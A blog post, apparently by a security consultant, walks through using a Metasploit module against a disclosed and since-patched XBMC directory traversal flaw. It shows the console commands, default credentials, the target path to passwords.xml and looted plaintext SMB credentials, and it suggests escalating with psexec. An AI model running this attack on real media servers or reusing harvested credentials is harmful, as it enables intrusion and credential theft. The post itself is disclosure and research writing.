<!DOCTYPE html>
<html lang="en-US">
	<head>
		<meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
		<link href="//fonts.googleapis.com/css?family=Raleway:400,700%7COpen+Sans:400,700,400italic" media="all" rel="stylesheet" type="text/css">
		<link href='//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css' rel='stylesheet'/>
		<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
		<meta content='blogger' name='generator'/>
		<link href='http://test.andreko.net//favicon.ico' rel='icon' type='image/x-icon'/>
		<link href='http://test.andreko.net/' rel='canonical'/>
		
		
		<title>XBMC Traversal Metasploit Module</title>
		<meta content='YOUR DESCRIPTION HERE' name='description'/>
		<meta content='YOUR KEYWORDS HERE' name='keywords'/>
		<meta content='Facebook App ID here' property='fb:app_id'/>
		<meta content='Facebook Admin ID here' property='fb:admins'/>
		
		<meta content='@mandreko' name='twitter:site'/>
		<meta content='@mandreko' name='twitter:creator'/>
		
		<link type="text/css" rel="stylesheet" href="/css/main.css" />
		<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js' type='text/javascript'></script>
		
		<script type="text/javascript">
			var _gaq=[['_setAccount','UA-25280110-1'],['_trackPageview']];
			(function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
			g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
			s.parentNode.insertBefore(g,s)}(document,'script'));
		</script>
		
	</head>
	<body class='index'>
	
	<div class='head-wrap'>
		<div class='row' id='header-wrappers'>
			<div class='headerleft'>
				<div class='headerleft section' id='headerleft'>
					<div class='widget Header' data-version='1' id='Header1'>
						<div id='header-inner'>
							<a href='/' style='display: block'><h1 style='display:none'></h1>
								<img alt="Logo" height="55px; " id="Header1_headerimg" src="/img/logo.png" style="display: block" width="311px; ">
							</a>
						</div>
					</div>
				</div>
			</div>
			<div style='clear: both;'></div>
		</div>
	</div>
	<div class='navi-menu'>
		<div class='nav-menu section' id='Navigation Menu' name='Navigation Menu'>
			<div class='widget LinkList' data-version='1' id='LinkList100'>
				<div class='widget-content'>
					<ul id='nav' itemscope='' itemtype='http://schema.org/SiteNavigationElement'>
						<li itemprop='name'><a href='http://test.andreko.net/' itemprop='url'>HOME</a></li>
						<li itemprop='name'><a href='http://test.andreko.net//categories' itemprop='url'>CATEGORIES</a></li>
						<li itemprop='name'><a href='#' itemprop='url'>ARCHIVE</a></li>
						<li itemprop='name'><a href='#' itemprop='url'>RESUME</a></li>
					</ul>
					<select class="selectnav" id="selectnav2">
						<option value="">Menu</option>
						<option value="http://test.andreko.net/">HOME</option>
						<option value="http://test.andreko.net//categories">CATEGORIES</option>
						<option value="#">ARCHIVE</option>
						<option value="#">RESUME</option>
					</select>
				</div>
			</div>
		</div>
		<div class='top-bar-social blue section' id='header social widget' name='Top Social Widget'>
			<div class='widget LinkList' data-version='1' id='LinkList230'>
				<div class='widget-content'>
					<ul id='social'>
						
							<li><a class='facebook' href='https://www.facebook.com/mattandreko' title='facebook'></a></li>
						
						
							<li><a class='twitter' href='https://www.twitter.com/mandreko' title='twitter'></a></li>
						
						
							<li><a class='gplus' href='https://plus.google.com/mandreko' title='gplus'></a></li>
						
						
							<li><a class='linkedin' href='https://www.linkedin.com/mattandreko' title='linkedin'></a></li>
						
						
							<li><a class='stack-overflow' href='http://stackoverflow.com/story/mattandreko' title='stack-overflow'></a></li>
						
						
							<li><a class='github' href='https://www.github.com/mandreko' title='github'></a></li>
						
						
							<li><a class='instagram' href='https://www.instagram.com/mandreko' title='instagram'></a></li>
						
					</ul>
				</div>
			</div>
		</div>
		<div style='clear: both;'></div>
	</div>
	
	<div style='clear: both;'></div>
	<div id="outer-wrapper" class="index home">


<div class='row' id='content-wrapper'>
    <div id='main-wrapper'>
      <div class='main section' id='main'>
      


        <div id="main">
          <div id="content">
            <div>
              <article class="hentry" role="article">

                
                

                <div class="entry-content">
                  
                  
                  

<h2 id="background">Background</h2>

<p>I was talking in <a href="irc://chat.freenode.net:6667/intern0t">Intern0t</a> several months ago. <a href="https://twitter.com/Acidgen">AcidGen</a>, from <a href="http://www.ioactive.com">IOActive</a> mentioned that he found a bug in <a href="http://www.xbmc.org">XBMC</a>. I use <a href="http://www.xbmc.org">XBMC</a> quite a bit at home, on various platforms, since it&rsquo;s extremely wife-friendly. I hit him up, and we started talking. We had a nice Skype conversation, where we discussed possible platforms that were affected, and future exploits that we&rsquo;d like to find. Since I had a jailbroken <a href="https://www.apple.com/appletv">Apple TV 2</a> and <a href="http://www.raspberrypi.org">RaspberryPi</a>, I told him that I could test those platforms and help out.</p>

<!-- more -->

<p>An <a href="http://www.ioactive.com/pdfs/Security_Advisory_XBMC.pdf">official disclosure</a> was released, detailing the directory traversal vulnerability. The <a href="http://www.xbmc.org">XBMC</a> team was able to make a <a href="https://github.com/xbmc/xbmc/commit/bdff099c024521941cb0956fe01d99ab52a65335">fix</a>, and the new version 12 is not vulnerable.</p>

<h2 id="why-does-this-vulnerability-matter">Why does this vulnerability matter?</h2>

<p>When talking with the <a href="http://www.xbmc.org">XBMC</a>, they seemed to play off the vulnerability, because they believed nobody would ever expose this service to a public network. However, a quick <a href="http://www.shodanhq.com/search?q=xbmc">ShodanHQ</a> search shows that people are exposing it. But you may say, &ldquo;Matt, this is only a directory traversal vulnerability, what are you going to do, steal someone&rsquo;s MP3s?&rdquo;. The issue here, lies in that if you can read any file on the system, that may include password files, such as /etc/passwd or even /etc/shadow if the service runs as root. What makes this even worse, is that due to how XBMC has to pass credentials to a fileserver, it stores the credentials in plain text. This gives an attacker a <i>huge</i> advantage. They now have valid credentials on at least one system. If the system has SMB exposed as well, it could easily be game-over.</p>

<h2 id="let-s-see-the-exploit">Let&rsquo;s see the exploit&hellip;</h2>

<p>I don&rsquo;t know why it took so long, but I finally finished the MSF module for this vulnerability. It can be found <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/xbmc_traversal.rb">here</a>. The usage is pretty simple. Here is a sample exploitation against an <a href="https://www.apple.com/appletv">Apple TV 2</a>.</p>

<p>As usual, watch the pretty ASCII-art go by, and use the module.</p>

<pre><code>420-1572-man:gather mandreko$ msfconsole
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v4.6.0-dev [core:4.6 api:1.0]
+ -- --=[ 1048 exploits - 590 auxiliary - 174 post
+ -- --=[ 275 payloads - 28 encoders - 8 nops

msf &gt; use auxiliary/gather/xbmc_traversal
msf  auxiliary(xbmc_traversal) &gt;
&lt;/pre&gt;Check out the options. You'll see the username and password that need to be set (however it's often defaulted to &quot;xbmc&quot;, as well as the host, and file to disclose. 
&lt;pre&gt;msf  auxiliary(xbmc_traversal) &gt; show options

Module options (auxiliary/gather/xbmc_traversal):

   Name      Current Setting                                                      Required  Description
   ----      ---------------                                                      --------  -----------
   DEPTH     9                                                                    yes       The max traversal depth
   FILEPATH  /private/var/mobile/Library/Preferences/XBMC/userdata/passwords.xml  no        The name of the file to download
   PASSWORD  xbmc                                                                 yes       The password to use for the HTTP server
   Proxies                                                                        no        Use a proxy chain
   RHOST                                                                          yes       The target address
   RPORT     8080                                                                 yes       The target port
   USERNAME  xbmc                                                                 yes       The username to use for the HTTP server
   VHOST                                                                          no        HTTP server virtual host

msf  auxiliary(xbmc_traversal) &gt;
</code></pre>

<p>Go ahead and set the RHOST to the XBMC server.</p>

<pre><code>msf  auxiliary(xbmc_traversal) &gt; set rhost 192.168.1.102
rhost =&gt; 192.168.1.102
msf  auxiliary(xbmc_traversal) &gt;
</code></pre>

<p>Lastly, run the exploit</p>

<pre><code>msf  auxiliary(xbmc_traversal) &gt; run

[+] File saved in: /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml
[*] Auxiliary module execution completed
msf  auxiliary(xbmc_traversal) &gt;
</code></pre>

<p>You can see this was successful. It saved the file locally, and added notes in <a href="http://www.metasploit.com">Metasploit</a>. Just to verify the findings, you can read the file it saved.</p>

<pre><code>msf  auxiliary(xbmc_traversal) &gt; cat /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml
</code></pre>

<pre><code>[*] exec: cat /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml

&lt;passwords&gt;
    &lt;path&gt;
        &lt;from pathversion=&quot;1&quot;&gt;smb://192.168.1.2/Movies&lt;/from&gt;
        &lt;to pathversion=&quot;1&quot;&gt;smb://xbmc:xbmc@192.168.1.2/Movies/&lt;/to&gt;
    &lt;/path&gt;
    &lt;path&gt;
        &lt;from pathversion=&quot;1&quot;&gt;smb://192.168.1.2/tv&lt;/from&gt;
        &lt;to pathversion=&quot;1&quot;&gt;smb://xbmc:xbmc@192.168.1.2/tv/&lt;/to&gt;
    &lt;/path&gt;
    &lt;path&gt;
        &lt;from pathversion=&quot;1&quot;&gt;smb://192.168.1.2/Music&lt;/from&gt;
        &lt;to pathversion=&quot;1&quot;&gt;smb://xbmc:xbmc@192.168.1.2/Music/&lt;/to&gt;
    &lt;/path&gt;
&lt;/passwords&gt;
msf  auxiliary(xbmc_traversal) &gt;
</code></pre>

<p>And there you have it. You now have valid credentials on that fileserver. You could start escalating with psexec or other methods. Half the battle is already over.</p>

                </div>
                
              </article>
            </div>
          </div>
        </div>


      
      </div>
    </div>
    
    <div id='sidebar-wrapper'>
      <div class='sidebar ready-widget section' id='sidebar'>
        <div class='widget HTML' data-version='1' id='HTML3'>
	<h2 class='title'>Author</h2>
	<div class='widget-content'>
		<div class="sidebar_about_author">
			<div class="inner_wrapper">
				<div class="aboutme-img">
					<img alt="Author" class="img-responsive" height="388px" src="http://test.andreko.net/img/mattandreko_photo.jpg" title="Author (Matt Andreko)" width="300px">
				</div>
			</div>
			<div class="aboutme-info">
				<h4>Matt Andreko</h4>
				<p>Security Consultant</p>
			</div>
		</div>
	</div>
	<div class='clear'></div>
</div>
        <div class='RecentPosts' data-version='1' id='RecentPosts1'>
	<h2>Recent Posts</h2>
	<div class='widget-content recent-posts'>
		<ul>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='http://test.andreko.net/2014/12/17/compiling-sslscan-with-sslv2-support-on-osx/'>
							<img alt='Compiling SSLScan with SSLv2 support on OSX' border='0' height='72' src='http://test.andreko.net/img/sslscan_apple.png' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='http://test.andreko.net/2014/12/17/compiling-sslscan-with-sslv2-support-on-osx/'>Compiling SSLScan with SSLv2 support on OSX</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='http://test.andreko.net/2014/08/01/burp-icon-in-osx/'>
							<img alt='Burp Icon in OSX' border='0' height='72' src='http://test.andreko.net/img/automator_burp.png' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='http://test.andreko.net/2014/08/01/burp-icon-in-osx/'>Burp Icon in OSX</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='http://test.andreko.net/2014/01/13/backdoor-modules-for-netgear-linksys-and-other-routers/'>
							<img alt='Backdoor Modules for Netgear, Linksys, and Other Routers' border='0' height='72' src='http://test.andreko.net/img/backdoor_all_the_routers.jpg' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='http://test.andreko.net/2014/01/13/backdoor-modules-for-netgear-linksys-and-other-routers/'>Backdoor Modules for Netgear, Linksys, and Other Routers</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='http://test.andreko.net/2013/11/20/brainpan2/'>
							<img alt='Brainpan2' border='0' height='72' src='http://test.andreko.net/img/brainpan.jpg' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='http://test.andreko.net/2013/11/20/brainpan2/'>Brainpan2</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='http://test.andreko.net/2013/06/18/canon-y-u-no-security/'>
							<img alt='Canon, Y U NO Security?' border='0' height='72' src='http://test.andreko.net/img/y-u-no-guy.jpg' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='http://test.andreko.net/2013/06/18/canon-y-u-no-security/'>Canon, Y U NO Security?</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
		</ul>
		<div class='clear'></div>
	</div>
</div>

        <div class='widget Label' data-version='1' id='Label1'>
	<h2>Top Categories</h2>
	<div class='widget-content cloud-label-widget-content'>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/hacking'>hacking</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/wargames'>wargames</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/linux'>linux</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/exploit-exercises'>exploit-exercises</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/protostar'>protostar</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/overthewire'>overthewire</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/natas'>natas</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/nebula'>nebula</a>
			</span>
		
		<div class='clear'></div>
	</div>
</div>
      </div>
    </div>
    <div style='clear: both;'></div>
  </div>





		</div>
		
		<div id='w2t_footer'>
			<div class='w2t-copy-container row'>
				<div class='w2t_footer_copyright'>
					Copyright &copy;
					<script type='text/javascript'>
						var creditsyear = new Date();
						document.write(creditsyear.getFullYear());
					</script>
					Matt Andreko. All Rights Reserved
				</div>
			</div>
		</div>
		
		
			
				<script type="text/javascript">
	var disqus_shortname = 'mattandreko';
	var disqus_script = 'count.js';

	(function () {
		var dsq = document.createElement('script'); 
		dsq.type = 'text/javascript'; 
		dsq.async = true;
		dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
	}());
</script>
			
		
	</body>
</html>

